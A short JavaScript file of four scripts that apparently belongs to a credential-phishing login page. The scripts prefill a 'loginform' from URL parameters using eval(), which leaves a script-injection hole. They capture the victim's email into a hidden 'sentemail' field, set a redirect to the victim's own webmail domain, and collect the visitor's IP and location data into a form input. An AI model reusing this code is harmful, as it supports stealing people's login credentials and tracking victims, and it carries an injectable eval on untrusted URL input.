// Script 1
// Auto populate form details using the form name from url get data
function FillForm() {
  var FormName = "loginform";
  var questionlocation = location.href.indexOf("?");
  if (questionlocation < 0) {
    return;
  }
  var q = location.href.substr(questionlocation + 1);
  var list = q.split("&");
  for (var i = 0; i < list.length; i++) {
    var kv = list[i].split("=");
    if (!eval("document." + FormName + "." + kv[0])) {
      continue;
    }
    kv[1] = unescape(kv[1]);
    if (kv[1].indexOf('"') > -1) {
      var re = /"/g;
      kv[1] = kv[1].replace(re, '\\"');
    }
    eval("document." + FormName + "." + kv[0] + '.value="' + kv[1] + '"');
  }
}
FillForm();

// Script 2
// Auto get domain name from user to add to webmail
const queryString = window.location.search;
const parameters = new URLSearchParams(queryString);
const value1 = parameters.get("user");
document.querySelector('input[name="_after"]').value =
  "https://webmail." + value1.split("@")[1];

// Script 3
// Get email of user
// var value2 = queryString.split('@')[1];
var sentemail = parameters.get("user");
document.querySelector('input[name="sentemail"]').value = sentemail;

// Script 4
// Get user ip details
// var value2 = queryString.split('@')[1];
$.getJSON("https://api.ipregistry.co/?key=tryout", function (data) {
  console.log(JSON.stringify(data, null, 2));
  var Myelement = document.getElementById("ipFormInput");
  Myelement.value = JSON.stringify(data, null, 2);
});

